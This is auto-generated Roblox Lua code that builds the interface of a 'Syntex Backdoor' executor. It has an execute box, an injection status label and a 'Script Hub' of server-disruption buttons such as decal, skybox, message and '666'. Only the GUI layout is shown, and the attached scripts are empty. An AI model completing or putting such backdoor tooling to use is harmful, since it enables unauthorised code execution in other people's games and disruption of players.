--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 148 | Scripts: 29 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.SyntexHub
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[SyntexHub]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.SyntexHub.SS
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Size"] = UDim2.new(0, 497, 0, 289);
G2L["2"]["Position"] = UDim2.new(0.2194, 0, 0.15793, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[SS]];


-- StarterGui.SyntexHub.SS.UIGradient
G2L["3"] = Instance.new("UIGradient", G2L["2"]);



-- StarterGui.SyntexHub.SS.UIStroke
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.DraggableGUI
G2L["5"] = Instance.new("LocalScript", G2L["2"]);
G2L["5"]["Name"] = [[DraggableGUI]];


-- StarterGui.SyntexHub.SS.rainbowGradient
G2L["6"] = Instance.new("LocalScript", G2L["2"]);
G2L["6"]["Name"] = [[rainbowGradient]];


-- StarterGui.SyntexHub.SS.UICorner
G2L["7"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.SyntexHub.SS.Execute
G2L["8"] = Instance.new("TextButton", G2L["2"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 24;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["8"]["Size"] = UDim2.new(0, 157, 0, 35);
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["Name"] = [[Execute]];
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Execute]];
G2L["8"]["Position"] = UDim2.new(0.02829, 0, 0.84106, 0);


-- StarterGui.SyntexHub.SS.Execute.UICorner
G2L["9"] = Instance.new("UICorner", G2L["8"]);



-- StarterGui.SyntexHub.SS.Execute.UIStroke
G2L["a"] = Instance.new("UIStroke", G2L["8"]);
G2L["a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.Hide
G2L["b"] = Instance.new("TextButton", G2L["2"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["TextSize"] = 25;
G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["TextScaled"] = true;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["b"]["Size"] = UDim2.new(0, 64, 0, 35);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Name"] = [[Hide]];
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 41, 9);
G2L["b"]["Text"] = [[Hide]];
G2L["b"]["Position"] = UDim2.new(0.72849, -11, 0.84106, 0);


-- StarterGui.SyntexHub.SS.Hide.UICorner
G2L["c"] = Instance.new("UICorner", G2L["b"]);



-- StarterGui.SyntexHub.SS.Hide.UIStroke
G2L["d"] = Instance.new("UIStroke", G2L["b"]);
G2L["d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.Hide.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["b"]);



-- StarterGui.SyntexHub.SS.ScanButton
G2L["f"] = Instance.new("TextButton", G2L["2"]);
G2L["f"]["TextWrapped"] = true;
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["TextSize"] = 14;
G2L["f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["TextScaled"] = true;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["f"]["Size"] = UDim2.new(0, 192, 0, 33);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Name"] = [[ScanButton]];
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[Statut : Not injected]];
G2L["f"]["Position"] = UDim2.new(0.43523, 0, 0.038, 0);


-- StarterGui.SyntexHub.SS.ScanButton.UIStroke
G2L["10"] = Instance.new("UIStroke", G2L["f"]);
G2L["10"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["10"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.ScanButton.UICorner
G2L["11"] = Instance.new("UICorner", G2L["f"]);



-- StarterGui.SyntexHub.SS.ScriptHubB
G2L["12"] = Instance.new("TextButton", G2L["2"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["TextSize"] = 25;
G2L["12"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["TextScaled"] = true;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["12"]["Size"] = UDim2.new(0, 58, 0, 35);
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["Name"] = [[ScriptHubB]];
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 41, 9);
G2L["12"]["Text"] = [[Script Hub]];
G2L["12"]["Position"] = UDim2.new(0.87738, -11, 0.84106, 0);


-- StarterGui.SyntexHub.SS.ScriptHubB.UICorner
G2L["13"] = Instance.new("UICorner", G2L["12"]);



-- StarterGui.SyntexHub.SS.ScriptHubB.UIStroke
G2L["14"] = Instance.new("UIStroke", G2L["12"]);
G2L["14"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["14"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.ScriptHubB.LocalScript
G2L["15"] = Instance.new("LocalScript", G2L["12"]);



-- StarterGui.SyntexHub.SS.r6
G2L["16"] = Instance.new("TextButton", G2L["2"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["TextSize"] = 25;
G2L["16"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["TextScaled"] = true;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 58, 0, 34);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["Name"] = [[r6]];
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 41, 9);
G2L["16"]["Text"] = [[R6]];
G2L["16"]["Position"] = UDim2.new(0.87738, -11, 0.03532, 0);


-- StarterGui.SyntexHub.SS.r6.UICorner
G2L["17"] = Instance.new("UICorner", G2L["16"]);



-- StarterGui.SyntexHub.SS.r6.UIStroke
G2L["18"] = Instance.new("UIStroke", G2L["16"]);
G2L["18"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["18"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.source
G2L["19"] = Instance.new("TextBox", G2L["2"]);
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["19"]["TextSize"] = 14;
G2L["19"]["Name"] = [[source]];
G2L["19"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(87, 87, 87);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["MultiLine"] = true;
G2L["19"]["ClearTextOnFocus"] = false;
G2L["19"]["PlaceholderText"] = [[-- Put ur stupid script here]];
G2L["19"]["Size"] = UDim2.new(0, 469, 0, 174);
G2L["19"]["Position"] = UDim2.new(0.02998, 0, 0.19981, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[]];


-- StarterGui.SyntexHub.SS.source.UIStroke
G2L["1a"] = Instance.new("UIStroke", G2L["19"]);
G2L["1a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1a"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.hideIMG
G2L["1b"] = Instance.new("ImageLabel", G2L["2"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["Image"] = [[rbxassetid://76918652936201]];
G2L["1b"]["Size"] = UDim2.new(0, 467, 0, 173);
G2L["1b"]["Visible"] = false;
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Name"] = [[hideIMG]];
G2L["1b"]["Position"] = UDim2.new(0.0303, 0, 0.19981, 0);


-- StarterGui.SyntexHub.SS.hideIMG.srry
G2L["1c"] = Instance.new("TextLabel", G2L["1b"]);
G2L["1c"]["TextWrapped"] = true;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextScaled"] = true;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["TextSize"] = 14;
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["Size"] = UDim2.new(0, 258, 0, 50);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[Sorry Skid]];
G2L["1c"]["Name"] = [[srry]];
G2L["1c"]["Position"] = UDim2.new(0.18114, 0, 0.71264, 0);


-- StarterGui.SyntexHub.SS.hideIMG.u
G2L["1d"] = Instance.new("TextLabel", G2L["1b"]);
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextScaled"] = true;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Size"] = UDim2.new(0, 213, 0, 30);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[You rn]];
G2L["1d"]["Name"] = [[u]];
G2L["1d"]["Position"] = UDim2.new(-0.0965, 0, -0.0001, 0);


-- StarterGui.SyntexHub.SS.hideIMG.ImageLabel
G2L["1e"] = Instance.new("ImageLabel", G2L["1b"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["ImageColor3"] = Color3.fromRGB(255, 0, 0);
G2L["1e"]["Image"] = [[rbxassetid://81067082063409]];
G2L["1e"]["Size"] = UDim2.new(0, 51, 0, 51);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["BackgroundTransparency"] = 1;
G2L["1e"]["Rotation"] = 20;
G2L["1e"]["Position"] = UDim2.new(0.22535, 0, 0.04141, 0);


-- StarterGui.SyntexHub.SS.TextLabel
G2L["1f"] = Instance.new("TextLabel", G2L["2"]);
G2L["1f"]["TextWrapped"] = true;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextScaled"] = true;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["TextSize"] = 26;
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Size"] = UDim2.new(0, 200, 0, 55);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[Syntex Backdoor]];
G2L["1f"]["Position"] = UDim2.new(0.01399, 0, -0.00357, 0);


-- StarterGui.SyntexHub.SS.Clear
G2L["20"] = Instance.new("TextButton", G2L["2"]);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextSize"] = 24;
G2L["20"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["20"]["Size"] = UDim2.new(0, 157, 0, 35);
G2L["20"]["BackgroundTransparency"] = 1;
G2L["20"]["Name"] = [[Clear]];
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[Clear]];
G2L["20"]["Position"] = UDim2.new(0.3695, 0, 0.84106, 0);


-- StarterGui.SyntexHub.SS.Clear.UICorner
G2L["21"] = Instance.new("UICorner", G2L["20"]);



-- StarterGui.SyntexHub.SS.Clear.UIStroke
G2L["22"] = Instance.new("UIStroke", G2L["20"]);
G2L["22"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["22"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SS.Clear.LocalScript
G2L["23"] = Instance.new("LocalScript", G2L["20"]);



-- StarterGui.SyntexHub.SS.MainSystem
G2L["24"] = Instance.new("LocalScript", G2L["2"]);
G2L["24"]["Name"] = [[MainSystem]];


-- StarterGui.SyntexHub.SriptHub
G2L["25"] = Instance.new("Frame", G2L["1"]);
G2L["25"]["Visible"] = false;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["Size"] = UDim2.new(0, 497, 0, 289);
G2L["25"]["Position"] = UDim2.new(0.08189, 0, 0.24536, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Name"] = [[SriptHub]];


-- StarterGui.SyntexHub.SriptHub.UIGradient
G2L["26"] = Instance.new("UIGradient", G2L["25"]);



-- StarterGui.SyntexHub.SriptHub.UIStroke
G2L["27"] = Instance.new("UIStroke", G2L["25"]);
G2L["27"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["27"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.DraggableGUI
G2L["28"] = Instance.new("LocalScript", G2L["25"]);
G2L["28"]["Name"] = [[DraggableGUI]];


-- StarterGui.SyntexHub.SriptHub.UICorner
G2L["29"] = Instance.new("UICorner", G2L["25"]);



-- StarterGui.SyntexHub.SriptHub.rainbowGradient
G2L["2a"] = Instance.new("LocalScript", G2L["25"]);
G2L["2a"]["Name"] = [[rainbowGradient]];


-- StarterGui.SyntexHub.SriptHub.TextLabel
G2L["2b"] = Instance.new("TextLabel", G2L["25"]);
G2L["2b"]["TextWrapped"] = true;
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextScaled"] = true;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["TextSize"] = 26;
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["2b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["BackgroundTransparency"] = 1;
G2L["2b"]["Size"] = UDim2.new(0, 333, 0, 55);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[Script Hub]];
G2L["2b"]["Position"] = UDim2.new(0.16489, 0, 0.02411, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame
G2L["2c"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["2c"]["Active"] = true;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(166, 166, 166);
G2L["2c"]["Size"] = UDim2.new(0, 465, 0, 157);
G2L["2c"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Position"] = UDim2.new(0.03823, 0, 0.23875, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["BackgroundTransparency"] = 1;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.UICorner
G2L["2d"] = Instance.new("UICorner", G2L["2c"]);
G2L["2d"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.UIStroke
G2L["2e"] = Instance.new("UIStroke", G2L["2c"]);
G2L["2e"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Decal
G2L["2f"] = Instance.new("TextButton", G2L["2c"]);
G2L["2f"]["TextWrapped"] = true;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["TextSize"] = 14;
G2L["2f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["TextScaled"] = true;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2f"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["2f"]["BackgroundTransparency"] = 1;
G2L["2f"]["Name"] = [[Decal]];
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Text"] = [[Set Decal]];
G2L["2f"]["Position"] = UDim2.new(0.03659, 0, 0.03034, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Decal.UICorner
G2L["30"] = Instance.new("UICorner", G2L["2f"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Decal.UIStroke
G2L["31"] = Instance.new("UIStroke", G2L["2f"]);
G2L["31"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["31"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Decal.LocalScript
G2L["32"] = Instance.new("LocalScript", G2L["2f"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Particles
G2L["33"] = Instance.new("TextButton", G2L["2c"]);
G2L["33"]["TextWrapped"] = true;
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["TextSize"] = 14;
G2L["33"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["TextScaled"] = true;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["33"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["33"]["BackgroundTransparency"] = 1;
G2L["33"]["Name"] = [[Particles]];
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Text"] = [[Set Particles]];
G2L["33"]["Position"] = UDim2.new(0.03659, 0, 0.15645, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Particles.UICorner
G2L["34"] = Instance.new("UICorner", G2L["33"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Particles.UIStroke
G2L["35"] = Instance.new("UIStroke", G2L["33"]);
G2L["35"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["35"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Particles.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["33"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.666
G2L["37"] = Instance.new("TextButton", G2L["2c"]);
G2L["37"]["TextWrapped"] = true;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["TextSize"] = 14;
G2L["37"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["TextScaled"] = true;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["37"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["37"]["BackgroundTransparency"] = 1;
G2L["37"]["Name"] = [[666]];
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Text"] = [[666]];
G2L["37"]["Position"] = UDim2.new(0.03659, 0, 0.27849, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.666.UICorner
G2L["38"] = Instance.new("UICorner", G2L["37"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.666.UIStroke
G2L["39"] = Instance.new("UIStroke", G2L["37"]);
G2L["39"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["39"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.666.LocalScript
G2L["3a"] = Instance.new("LocalScript", G2L["37"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Hint
G2L["3b"] = Instance.new("TextButton", G2L["2c"]);
G2L["3b"]["TextWrapped"] = true;
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextSize"] = 14;
G2L["3b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["TextScaled"] = true;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3b"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["3b"]["BackgroundTransparency"] = 1;
G2L["3b"]["Name"] = [[Hint]];
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[Set Hint]];
G2L["3b"]["Position"] = UDim2.new(0.03659, 0, 0.38834, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Hint.UICorner
G2L["3c"] = Instance.new("UICorner", G2L["3b"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Hint.UIStroke
G2L["3d"] = Instance.new("UIStroke", G2L["3b"]);
G2L["3d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3d"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Hint.LocalScript
G2L["3e"] = Instance.new("LocalScript", G2L["3b"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Message
G2L["3f"] = Instance.new("TextButton", G2L["2c"]);
G2L["3f"]["TextWrapped"] = true;
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["TextSize"] = 14;
G2L["3f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["TextScaled"] = true;
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3f"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["3f"]["BackgroundTransparency"] = 1;
G2L["3f"]["Name"] = [[Message]];
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Text"] = [[Set Message]];
G2L["3f"]["Position"] = UDim2.new(0.03659, 0, 0.50628, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Message.UICorner
G2L["40"] = Instance.new("UICorner", G2L["3f"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Message.UIStroke
G2L["41"] = Instance.new("UIStroke", G2L["3f"]);
G2L["41"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["41"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Message.LocalScript
G2L["42"] = Instance.new("LocalScript", G2L["3f"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Disco
G2L["43"] = Instance.new("TextButton", G2L["2c"]);
G2L["43"]["TextWrapped"] = true;
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["TextSize"] = 14;
G2L["43"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["TextScaled"] = true;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["43"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["43"]["BackgroundTransparency"] = 1;
G2L["43"]["Name"] = [[Disco]];
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Text"] = [[Disco]];
G2L["43"]["Position"] = UDim2.new(0.03659, 0, 0.62616, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Disco.UICorner
G2L["44"] = Instance.new("UICorner", G2L["43"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Disco.UIStroke
G2L["45"] = Instance.new("UIStroke", G2L["43"]);
G2L["45"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["45"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Disco.LocalScript
G2L["46"] = Instance.new("LocalScript", G2L["43"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Skybox
G2L["47"] = Instance.new("TextButton", G2L["2c"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextSize"] = 14;
G2L["47"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["TextScaled"] = true;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["47"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["47"]["BackgroundTransparency"] = 1;
G2L["47"]["Name"] = [[Skybox]];
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[Set Skybox]];
G2L["47"]["Position"] = UDim2.new(0.03659, 0, 0.75978, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Skybox.UICorner
G2L["48"] = Instance.new("UICorner", G2L["47"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Skybox.UIStroke
G2L["49"] = Instance.new("UIStroke", G2L["47"]);
G2L["49"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["49"]["Thickness"] = 3;


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Skybox.LocalScript
G2L["4a"] = Instance.new("LocalScript", G2L["47"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Sound
G2L["4b"] = Instance.new("TextButton", G2L["2c"]);
G2L["4b"]["TextWrapped"] = true;
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["TextSize"] = 14;
G2L["4b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["TextScaled"] = true;
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4b"]["Size"] = UDim2.new(0, 430, 0, 50);
G2L["4b"]["BackgroundTransparency"] = 1;
G2L["4b"]["Name"] = [[Sound]];
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["Text"] = [[Set Sound]];
G2L["4b"]["Position"] = UDim2.new(0.03659, 0, 0.87448, 0);


-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Sound.UICorner
G2L["4c"] = Instance.new("UICorner", G2L["4b"]);



-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Sound.UIStroke
G2L["4d"] = Instance.new("UIStroke", G2L["4b"]);
G2L["4d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4d"]["Thickness"] = 3;


